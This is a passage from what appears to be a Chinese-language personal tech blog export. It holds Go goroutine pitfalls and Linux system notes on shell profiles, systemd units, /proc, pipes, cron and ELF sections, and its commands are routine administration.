fmt.Println(bfsFloor(pointT&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, pointT&#123;<span class="number">4</span>, <span class="number">0</span>&#125;, grid))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记-1"><a href="#踩坑记-1" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-编译报错"><a href="#1-编译报错" class="headerlink" title="1. 编译报错"></a>1. 编译报错</h2><h3 id="1-1-method-has-pointer-receiverd"><a href="#1-1-method-has-pointer-receiverd" class="headerlink" title="1.1. method has pointer receiverd"></a>1.1. method has pointer receiverd</h3><ul>
<li>由于定义的接口多个方法的接受不一致导致</li>
<li>部分方法实现使用了指针，部分使用了原始类型</li>
<li>golang编译器发现<code>*T</code>类型实现了接口，调用的时候传入的又是<code>T</code>就给报错了</li>
</ul>
<h2 id="2-协程相关"><a href="#2-协程相关" class="headerlink" title="2. 协程相关"></a>2. 协程相关</h2><h3 id="2-1-循环起协程"><a href="#2-1-循环起协程" class="headerlink" title="2.1. 循环起协程"></a>2.1. 循环起协程</h3><ul>
<li>迭代器会被更改，最终留下的是最后一个</li>
<li>应该当参数传入</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">	a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> a &#123;</span><br><span class="line">		wg.Add(<span class="number">2</span>)</span><br><span class="line">		<span class="comment">// 拿到的是最后一个</span></span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			<span class="keyword">defer</span> wg.Done()</span><br><span class="line">			fmt.Println(<span class="string">&quot;wrong&quot;</span>, i)</span><br><span class="line">		&#125;()</span><br><span class="line">		<span class="comment">// 这样就可以了</span></span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">			<span class="keyword">defer</span> wg.Done()</span><br><span class="line">			fmt.Println(<span class="string">&quot;right&quot;</span>, i)</span><br><span class="line">		&#125;(i)</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>linux相关知识</title>
    <url>/blogs/2021-02-27-linux/</url>
    <content><![CDATA[<ul>
<li><a href="/blogs/2018-09-16-shellStudy/">shell命令</a></li>
<li><a href="/blogs/2023-05-25-linux-performance/">linux性能观测和排查</a></li>
<li><a href="/blogs/2021-03-22-linux-kernel">linux内核学习</a></li>
</ul>
<h1 id="一、系统知识"><a href="#一、系统知识" class="headerlink" title="一、系统知识"></a>一、系统知识</h1><h2 id="1-profile、bashrc、bash-profile之间的关系"><a href="#1-profile、bashrc、bash-profile之间的关系" class="headerlink" title="1. profile、bashrc、bash_profile之间的关系"></a>1. <code>profile</code>、<code>bashrc</code>、<code>bash_profile</code>之间的关系</h2><ul>
<li><code>/etc/profile</code>： 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从&#x2F;etc&#x2F;profile.d目录的配置文件中搜集shell的设置。</li>
<li><code>/etc/bashrc</code>: 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取。</li>
<li><code>~/.bash_profile</code>: 每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。</li>
<li><code>~/.bashrc</code>: 该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。</li>
<li><code>~/.bash_logout</code>: 当每次退出系统(退出bash shell)时,执行该文件. 另外,&#x2F;etc&#x2F;profile中设定的变量(全局)的可以作用于任何用户,而~&#x2F;.bashrc等中设定的变量(局部)只能继承&#x2F;etc &#x2F;profile中的变量,他们是”父子”关系。</li>
<li><code>~/.bash_profile</code>是交互式、login 方式进入 bash 运行的</li>
<li>~&#x2F;.bashrc 是交互式 non-login 方式进入 bash 运行的通常二者设置大致相同，所以通常前者会调用后者。</li>
</ul>
<h2 id="2-service的几个知识"><a href="#2-service的几个知识" class="headerlink" title="2. service的几个知识"></a>2. service的几个知识</h2><h3 id="2-1-service-linux服务管理"><a href="#2-1-service-linux服务管理" class="headerlink" title="2.1. service linux服务管理"></a>2.1. service linux服务管理</h3><ul>
<li>service有两种管理方式，一个是用service命令，一个使用systemctl，自己感觉没啥区别，都需要写一个service文件</li>
<li>service文件位置: <code>/usr/lib/systemd/system/</code></li>
<li>服务文件内容一般如下，具体作用查看<code>man systemd.service</code></li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=OpenBSD Secure Shell server</span><br><span class="line"><span class="attr">Documentation</span>=man:sshd(<span class="number">8</span>) man:sshd_config(<span class="number">5</span>)</span><br><span class="line"><span class="attr">After</span>=network.target auditd.service</span><br><span class="line"><span class="attr">ConditionPathExists</span>=!/etc/ssh/sshd_not_to_be_run</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">EnvironmentFile</span>=-/etc/default/ssh</span><br><span class="line"><span class="attr">ExecStartPre</span>=/usr/sbin/sshd -t</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/sbin/sshd -D <span class="variable">$SSHD_OPTS</span></span><br><span class="line"><span class="attr">ExecReload</span>=/usr/sbin/sshd -t</span><br><span class="line"><span class="attr">ExecReload</span>=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line"><span class="attr">KillMode</span>=process</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br><span class="line"><span class="attr">RestartPreventExitStatus</span>=<span class="number">255</span></span><br><span class="line"><span class="attr">Type</span>=notify</span><br><span class="line"><span class="attr">RuntimeDirectory</span>=sshd</span><br><span class="line"><span class="attr">RuntimeDirectoryMode</span>=<span class="number">0755</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="comment"># 这个是用来配置开机启动的目标，在multi-user模式下启动服务</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br><span class="line"><span class="attr">Alias</span>=sshd.service</span><br></pre></td></tr></table></figure>

<ul>
<li>配置了WantedBy后，使用<code>systemctl enable xxx</code>可以设置服务在某个模式下启动，会创建一个连接到<code>/etc/systemd/system/xxx.target.wanted/</code></li>
<li>一般配置开机启动设置WantedBy为<code>multi-user.target</code>，然后执行上一行的命令即可</li>
<li><code>Type=forking</code>会检测pidfile的进程状态</li>
</ul>
<h3 id="2-2-查看服务启动日志"><a href="#2-2-查看服务启动日志" class="headerlink" title="2.2. 查看服务启动日志"></a>2.2. 查看服务启动日志</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f 跟踪日志</span></span><br><span class="line">journalctl -u [service_name] -f</span><br></pre></td></tr></table></figure>

<h2 id="3-开机启动脚本"><a href="#3-开机启动脚本" class="headerlink" title="3. 开机启动脚本"></a>3. 开机启动脚本</h2><p>update-rc.d enable&#x2F;disable&#x2F;defaults</p>
<h2 id="4-设备event事件查看"><a href="#4-设备event事件查看" class="headerlink" title="4. 设备event事件查看"></a>4. 设备event事件查看</h2><ul>
<li>使用下面命令可以查看键盘插入或者触摸板移动等信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-w 跟踪</span></span><br><span class="line">dmesg -w</span><br></pre></td></tr></table></figure>

<ul>
<li>使用下面命令查看usb拔插事件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">udevadm monitor --environment --udev</span><br></pre></td></tr></table></figure>

<h2 id="5-用户组"><a href="#5-用户组" class="headerlink" title="5. 用户组"></a>5. 用户组</h2><h3 id="5-1-几个基本用法"><a href="#5-1-几个基本用法" class="headerlink" title="5.1. 几个基本用法"></a>5.1. 几个基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将用户变更主组到group_name</span></span><br><span class="line">usermod -g [group_name] [user_name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加用户组属性，不修改原有所属组</span></span><br><span class="line">usermod -a -G [group_name] [user_name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户所属组</span></span><br><span class="line">groups [user_name]</span><br></pre></td></tr></table></figure>

<h2 id="6-查看系统启动时间"><a href="#6-查看系统启动时间" class="headerlink" title="6. 查看系统启动时间"></a>6. 查看系统启动时间</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### who命令 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看最后一次系统启动时间</span></span><br><span class="line">=&gt; who -b</span><br><span class="line">         系统引导 2022-01-06 10:22</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前系统运行时间</span></span><br><span class="line">=&gt; who -r</span><br><span class="line">         运行级别 3 2022-01-06 10:24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### last命令 ##########</span></span></span><br><span class="line">=&gt; last reboot</span><br><span class="line">reboot   system boot  4.19.181         Thu Jan  6 10:22   still running</span><br><span class="line">reboot   system boot  4.19.181         Sat Dec 18 20:06 - 10:20 (18+14:14)</span><br><span class="line">reboot   system boot  4.19.181         Sat Dec 18 19:26 - 20:04  (00:38)</span><br><span class="line">reboot   system boot  4.19.181         Tue Dec  7 13:49 - 20:04 (11+06:15)</span><br><span class="line">reboot   system boot  4.19.163         Mon Nov 22 22:41 - 13:47 (14+15:06)</span><br><span class="line"></span><br><span class="line">wtmp begins Mon Nov 22 10:40:48 2021</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### uptime命令 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只能看当前时间和启动了多久</span></span><br><span class="line">=&gt; uptime</span><br><span class="line"> 10:37:02 up 3 days, 17:50,  0 users,  load average: 5.29, 5.16, 5.04</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### /proc/uptime ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示从系统启动到现在经过多少s</span></span><br><span class="line">=&gt; cat /proc/uptime</span><br><span class="line">16235.69 22108.34</span><br></pre></td></tr></table></figure>

<h2 id="7-定时任务"><a href="#7-定时任务" class="headerlink" title="7. 定时任务"></a>7. 定时任务</h2><h3 id="7-1-cron格式说明"><a href="#7-1-cron格式说明" class="headerlink" title="7.1. cron格式说明"></a>7.1. cron格式说明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*    *    *    *    *    *</span><br><span class="line">┬    ┬    ┬    ┬    ┬    ┬</span><br><span class="line">│    │    │    │    │    |</span><br><span class="line">│    │    │    │    │    └ 星期 (0 - 7) (0或7都是星期日)</span><br><span class="line">│    │    │    │    └───── 月份 (1 - 12)</span><br><span class="line">│    │    │    └────────── 日期 (1 - 31)</span><br><span class="line">│    │    └─────────────── 小时 (0 - 23)</span><br><span class="line">│    └──────────────────── 分钟 (0 - 59)</span><br><span class="line">└───────────────────────── 秒 (0 - 59, optional)</span><br></pre></td></tr></table></figure>

<h2 id="8-进程的几种状态"><a href="#8-进程的几种状态" class="headerlink" title="8. 进程的几种状态"></a>8. 进程的几种状态</h2><p><a href="/blogs/2018-09-16-shellStudy/#process_status">top进程状态解析</a></p>
<h2 id="9-dev-介绍"><a href="#9-dev-介绍" class="headerlink" title="9. &#x2F;dev 介绍"></a>9. &#x2F;dev 介绍</h2><h3 id="9-1-dev-random和-dev-urandom"><a href="#9-1-dev-random和-dev-urandom" class="headerlink" title="9.1. /dev/random和/dev/urandom"></a>9.1. <code>/dev/random</code>和<code>/dev/urandom</code></h3><ul>
<li>用于产生真随机数，其中<code>/dev/random</code>依赖系统中断，所以较慢，但是随机性更好</li>
<li><code>/dev/urandom</code>不依赖系统中断，随机性较差</li>
<li>它们都依赖一个系统熵<ul>
<li>熵足够，两个都是真随机</li>
<li>熵不足，<code>/dev/random</code>会阻塞，<code>/dev/urandom</code>不会阻塞，依赖算法</li>
</ul>
</li>
<li>查看熵池大小: <code>/proc/sys/kernel/random/poolsize</code></li>
<li>查看熵池可用的数量: <code>/proc/sys/kernel/random/entropy_avail</code></li>
<li><code>/dev/random</code>和<code>/dev/urandom</code>都是字符型设备，可以当作文件直接读取</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; stat /dev/random</span><br><span class="line">  File: /dev/random</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   character special file</span><br><span class="line">Device: 0,5     Inode: 8           Links: 1     Device type: 1,8</span><br><span class="line">Access: (0666/crw-rw-rw-)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Access: 2022-03-22 09:53:37.442304649 +0800</span><br><span class="line">Modify: 2022-03-22 09:53:37.442304649 +0800</span><br><span class="line">Change: 2022-03-22 09:53:37.442304649 +0800</span><br><span class="line"> Birth: -</span><br><span class="line">=&gt; stat /dev/urandom</span><br><span class="line">  File: /dev/urandom</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   character special file</span><br><span class="line">Device: 0,5     Inode: 9           Links: 1     Device type: 1,9</span><br><span class="line">Access: (0666/crw-rw-rw-)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Access: 2022-03-22 09:53:37.442304649 +0800</span><br><span class="line">Modify: 2022-03-22 09:53:37.442304649 +0800</span><br><span class="line">Change: 2022-03-22 09:53:37.442304649 +0800</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<p><strong>如果不存在，可以通过下面命令挂载</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mknod /dev/random c 1 8</span><br><span class="line">mknod /dev/urandom c 1 9</span><br></pre></td></tr></table></figure>

<h2 id="10-proc介绍"><a href="#10-proc介绍" class="headerlink" title="10. &#x2F;proc介绍"></a>10. &#x2F;proc介绍</h2><ul>
<li>&#x2F;proc内存放了进程的信息</li>
</ul>
<h3 id="10-2-proc-pid-进程信息"><a href="#10-2-proc-pid-进程信息" class="headerlink" title="10.2. /proc/[pid] 进程信息"></a>10.2. <code>/proc/[pid]</code> 进程信息</h3><ul>
<li><code>/proc/self</code>为当前进程信息，可以直接在程序中进行读取</li>
</ul>
<h4 id="1-fd-保存当前进程打开的句柄"><a href="#1-fd-保存当前进程打开的句柄" class="headerlink" title="1) fd 保存当前进程打开的句柄"></a>1) fd 保存当前进程打开的句柄</h4><ul>
<li>0: 标准输入</li>
<li>1: 标准输出</li>
<li>2: 标准错误输出</li>
</ul>
<h4 id="2-maps-进程内存空间信息"><a href="#2-maps-进程内存空间信息" class="headerlink" title="2) maps 进程内存空间信息"></a>2) maps 进程内存空间信息</h4><ul>
<li>加载了什么库及其地址</li>
<li>进程的基地址信息</li>
</ul>
<h4 id="3-limits-显示进程的一些限制"><a href="#3-limits-显示进程的一些限制" class="headerlink" title="3) limits 显示进程的一些限制"></a>3) limits 显示进程的一些限制</h4><ul>
<li>unlimited就是没有限制</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; cat /proc/self/limits</span><br><span class="line">Limit                     Soft Limit           Hard Limit           Units</span><br><span class="line">Max cpu time              unlimited            unlimited            seconds</span><br><span class="line">Max file size             unlimited            unlimited            bytes</span><br><span class="line">Max data size             unlimited            unlimited            bytes</span><br><span class="line">Max stack size            8388608              unlimited            bytes</span><br><span class="line">Max core file size        unlimited            unlimited            bytes</span><br><span class="line">Max resident set          unlimited            unlimited            bytes</span><br><span class="line">Max processes             14993                14993                processes</span><br><span class="line">Max open files            1024                 4096                 files</span><br><span class="line">Max locked memory         16777216             16777216             bytes</span><br><span class="line">Max address space         unlimited            unlimited            bytes</span><br><span class="line">Max file locks            unlimited            unlimited            locks</span><br><span class="line">Max pending signals       14993                14993                signals</span><br><span class="line">Max msgqueue size         819200               819200               bytes</span><br><span class="line">Max nice priority         0                    0</span><br><span class="line">Max realtime priority     0                    0</span><br><span class="line">Max realtime timeout      unlimited            unlimited            us</span><br></pre></td></tr></table></figure>

<p><strong>硬限制和软限制</strong></p>
<ul>
<li>硬限制只能由root用户进行扩大</li>
<li>软限制由用户自己修改，不能超过硬限制</li>
</ul>
<h4 id="4-cwd-当前工作目录"><a href="#4-cwd-当前工作目录" class="headerlink" title="4) cwd 当前工作目录"></a>4) cwd 当前工作目录</h4><ul>
<li>cwd是一个软连接，指向对应的工作目录</li>
<li>查看进程当前工作目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; ll /proc/57733/cwd</span><br><span class="line">lrwxrwxrwx 1 test test 0 Aug 16 09:29 /proc/57733/cwd -&gt; /home/test</span><br></pre></td></tr></table></figure>

<h3 id="10-3-proc-sys-保存内核的参数"><a href="#10-3-proc-sys-保存内核的参数" class="headerlink" title="10.3. /proc/sys 保存内核的参数"></a>10.3. <code>/proc/sys</code> 保存内核的参数</h3><ul>
<li>修改可以查看<a href="/blogs/2018-09-16-shellStudy/#37-sysctl-%E4%BF%AE%E6%94%B9%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0">sysctl</a></li>
</ul>
<h4 id="1-列举几个内核参数含义"><a href="#1-列举几个内核参数含义" class="headerlink" title="1) 列举几个内核参数含义"></a>1) 列举几个内核参数含义</h4><ul>
<li><code>/proc/sys/fs/file-max</code>: 系统最多能打开的文件句柄数</li>
<li><code>/proc/sys/kernel/threads-max</code>: 系统最大线程数量</li>
<li><code>/proc/sys/kernel/pid-max</code>: pid的最大数</li>
</ul>
<h4 id="2-proc-sys-net-ipv4-conf-interface-rp-filter"><a href="#2-proc-sys-net-ipv4-conf-interface-rp-filter" class="headerlink" title="2) /proc/sys/net/ipv4/conf/interface/rp_filter "></a>2) <code>/proc/sys/net/ipv4/conf/interface/rp_filter </code></h4><p><a href="/bookPages/docs/linux-kernel/net/ipv4/ipv4/index.html#21-rp_filter%E5%A6%82%E4%BD%95%E7%94%9F%E6%95%88">rp_filter在内核代码如何生效</a></p>
<ul>
<li>对应sysctl变量<code>net.ipv4.conf.[interface].rp_filter</code></li>
<li>内核取值会取all和当前进入的网卡较大的那个值</li>
<li><code>rp_filter</code>设置成1则会在当前网卡收包处理时，如果发现源地址作为目的地址路由不是指向此网卡，将会丢包，具体原理看上面链接</li>
<li>设置值的说明见 <a href="https://sysctl-explorer.net/net/ipv4/rp_filter/">rp_filter|sysctl-explorer.net</a></li>
</ul>
<h2 id="11-管道"><a href="#11-管道" class="headerlink" title="11. 管道"></a>11. 管道</h2><ul>
<li>进程间通信可以使用管道</li>
<li>管道的本质是起了两个子进程，一个进程的标准输出为另一个进程的标准输入</li>
</ul>
<h3 id="11-1-示例"><a href="#11-1-示例" class="headerlink" title="11.1. 示例"></a>11.1. 示例</h3><ul>
<li>使用read让管道两边的进程阻塞</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; &#123; echo &quot;aaa&quot;; read n &#125; | &#123; cat; read p &#125;</span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>

<ul>
<li>查看进程树</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; ps -auxf</span><br><span class="line">...</span><br><span class="line">test_user    2262  0.0  0.0  16840  8192 pts/2    Ss   11:41   0:01  |   \_ -zsh</span><br><span class="line">test_user   10342  0.0  0.0  16840  3412 pts/2    S+   14:20   0:00  |   |   \_ -zsh</span><br><span class="line">test_user   10343  0.0  0.0  10792   976 pts/2    S+   14:20   0:00  |   |   \_ cat</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>明显看到父进程起了两个子进程</li>
<li>再查看它们的句柄</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; ls -l /proc/10342/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 test_user test_user 64 Jun 20 14:27 0 -&gt; /dev/pts/2</span><br><span class="line">l-wx------ 1 test_user test_user 64 Jun 20 14:27 1 -&gt; &#x27;pipe:[224646]&#x27;</span><br><span class="line">lrwx------ 1 test_user test_user 64 Jun 20 14:27 10 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 test_user test_user 64 Jun 20 14:27 2 -&gt; /dev/pts/2</span><br><span class="line">=&gt; ls -l /proc/10343/fd</span><br><span class="line">total 0</span><br><span class="line">lr-x------ 1 test_user test_user 64 Jun 20 14:27 0 -&gt; &#x27;pipe:[224646]&#x27;</span><br><span class="line">lrwx------ 1 test_user test_user 64 Jun 20 14:27 1 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 test_user test_user 64 Jun 20 14:27 2 -&gt; /dev/pts/2</span><br></pre></td></tr></table></figure>

<ul>
<li>左边进程的标准输出到管道，右边进程的标准输入为管道</li>
</ul>
<h2 id="12-文件类型"><a href="#12-文件类型" class="headerlink" title="12. 文件类型"></a>12. 文件类型</h2><ul>
<li>linux下存在很多种文件类型，一切皆文件</li>
<li>使用<code>ls -l</code>可以查看文件类型</li>
</ul>
<p><strong>几种类型</strong></p>
<ul>
<li><code>-</code>: 普通文件，文本或二进制</li>
<li><code>d</code>: 目录</li>
<li><code>l</code>: 链接</li>
<li><code>b</code>: 块设备，磁盘就是块设备，可以向前向后读</li>
<li><code>c</code>: 字符型设备，比如<code>/dev/zero</code>、<code>/dev/random</code>等，只能读取当前</li>
<li><code>s</code>: 套接字文件，用于链接建立等</li>
<li><code>p</code>: 管道文件，不过一般是命名管道，正常的管道一般不可见</li>
</ul>
<h2 id="13-进程"><a href="#13-进程" class="headerlink" title="13. 进程"></a>13. 进程</h2><h3 id="13-1-最多能创建多少线程"><a href="#13-1-最多能创建多少线程" class="headerlink" title="13.1. 最多能创建多少线程"></a>13.1. 最多能创建多少线程</h3><ul>
<li>取决于进程的虚拟内存大小和每个线程需要占用的栈大小</li>
<li>32位系统下，4G虚拟内存，内核占用1G，剩余3G。每个线程栈大小，由<code>ulimit -s</code>可以查看，假设8M。那么最多创建300多个线程就会内存不足</li>
<li>64位系统下，取决于linux系统下的线程最大数量、全局pid号数量限制、进程可以拥有的VMA数量</li>
</ul>
<h3 id="13-2-最大能打开的文件句柄数"><a href="#13-2-最大能打开的文件句柄数" class="headerlink" title="13.2. 最大能打开的文件句柄数"></a>13.2. 最大能打开的文件句柄数</h3><h2 id="14-可执行文件的结构"><a href="#14-可执行文件的结构" class="headerlink" title="14. 可执行文件的结构"></a>14. 可执行文件的结构</h2><h3 id="14-1-查看可执行文件的大小"><a href="#14-1-查看可执行文件的大小" class="headerlink" title="14.1.  查看可执行文件的大小"></a>14.1.  查看可执行文件的大小</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; gcc -g main.cpp</span><br><span class="line">=&gt; size a.out</span><br><span class="line">   text    data     bss     dec     hex filename</span><br><span class="line">   1576     616       8    2200     898 a.out</span><br></pre></td></tr></table></figure>

<h3 id="14-2-解析"><a href="#14-2-解析" class="headerlink" title="14.2. 解析"></a>14.2. 解析</h3><h4 id="1-bss-未初始化数据区"><a href="#1-bss-未初始化数据区" class="headerlink" title="1) bss 未初始化数据区"></a>1) bss 未初始化数据区</h4><ul>
<li>Block Started by Symbol 以符号开始的段，通常指未初始化的数据段</li>
<li>代码中定义的未初始化的全局变量和静态变量存放到此区域</li>
<li>此区域会被内核初始化成0，所以为什么没有初始化的全局变量和静态变量会是0的原因</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; gcc -g main.cpp</span><br><span class="line">=&gt; size a.out</span><br><span class="line">   text    data     bss     dec     hex filename</span><br><span class="line">   1576     616    4008    6200    1838 a.out</span><br></pre></td></tr></table></figure>

<ul>
<li>可以看到bss段增加了<code>4 * 1000</code>字节</li>
</ul>
<h4 id="2-data-静态数据和全局初始化的数据区"><a href="#2-data-静态数据和全局初始化的数据区" class="headerlink" title="2) data 静态数据和全局初始化的数据区"></a>2) data 静态数据和全局初始化的数据区</h4><ul>
<li>初始化的静态变量和全局变量会放到此区域</li>
<li>初始化成0的变量会被编译器优化放到bss段</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; gcc -g main.cpp</span><br><span class="line">=&gt; size a.out</span><br><span class="line">   text    data     bss     dec     hex filename</span><br><span class="line">   1576     620      12    2208     8a0 a.out</span><br></pre></td></tr></table></figure>

<ul>
<li>可以看到定义了两个int型变量，一个增加了data段，一个增加了bss段，各4个字节</li>
</ul>
<h4 id="3-text-代码段，存放代码指令"><a href="#3-text-代码段，存放代码指令" class="headerlink" title="3) text 代码段，存放代码指令"></a>3) text 代码段，存放代码指令</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, world&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, world1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; gcc -g main.cpp</span><br><span class="line">=&gt; size a.out</span><br><span class="line">   text    data     bss     dec     hex filename</span><br><span class="line">   1605     616       8    2229     8b5 a.out</span><br></pre></td></tr></table></figure>

<ul>
<li>bss和data都没增加，text段增加了代码指令</li>
</ul>
<h1 id="二、有用的几个技巧"><a href="#二、有用的几个技巧" class="headerlink" title="二、有用的几个技巧"></a>二、有用的几个技巧</h1><h2 id="1-linux启动到文本界面和到图形界面"><a href="#1-linux启动到文本界面和到图形界面" class="headerlink" title="1. linux启动到文本界面和到图形界面"></a>1. linux启动到文本界面和到图形界面</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动到文本界面</span></span><br><span class="line">systemctl set-default multi-user.target</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动到图形界面</span></span><br><span class="line">systemctl set-default graphical.target</span><br></pre></td></tr></table></figure>

<h2 id="2-修改硬盘的uuid"><a href="#2-修改硬盘的uuid" class="headerlink" title="2. 修改硬盘的uuid"></a>2. 修改硬盘的uuid</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">随机生成uuid写入</span></span><br><span class="line">uuidgen | xargs tune2fs /dev/sda5 -U</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入自己生成uuid</span></span><br><span class="line">tune2fs -U c1b9d5a2-f162-11cf-9ece-0020afc76f16 /dev/sdb1</span><br></pre></td></tr></table></figure>

<h2 id="3-hostname立即生效"><a href="#3-hostname立即生效" class="headerlink" title="3. hostname立即生效"></a>3. hostname立即生效</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostname &quot;$(cat /etc/hostname)&quot;</span><br></pre></td></tr></table></figure>

